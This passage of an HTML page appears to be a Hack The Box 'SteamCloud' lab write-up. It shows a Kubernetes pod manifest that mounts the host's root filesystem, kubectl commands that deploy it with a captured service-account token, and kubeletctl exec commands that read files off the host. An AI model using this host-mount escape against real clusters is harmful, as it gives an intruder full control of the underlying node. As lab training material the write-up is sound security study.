+                                                [/openid/v1/jwks]                     []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version]                            []               [get]
+                                                [/version]                            []               [get]
+
+</code></pre>
+<h4 id="yaml-file-used-to-deploy-a-new-pod">.yaml file used to deploy a new pod</h4>
+<pre><code class="language-json">apiVersion: v1
+kind: Pod
+metadata:
+  name: nginxt
+  namespace: default
+spec:
+  containers:
+  - name: nginxt
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+</code></pre>
+<pre><code class="language-bash">└─$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 apply -f deploy.yaml 
+pod/nginxt created
+
+└─$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods
+NAME     READY   STATUS    RESTARTS   AGE
+nginx    1/1     Running   0          73m
+nginxt   1/1     Running   0          59s
+
+└─$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'ls /root' -p nginxt -c nginxt
+
+</code></pre>
+<p><img alt="image-20240221213729055" src="../assets/SteamCloud/image-20240221213729055.png" /></p>
+<pre><code class="language-bash">└─$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /root/home/user/user.txt' -p nginxt -c nginxt
+
+└─$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /root/root/root.txt' -p nginxt -c nginxt
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.c011b7c0.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.7389ff0e.min.js"></script>
+      
+    
+  </body>
+</html>
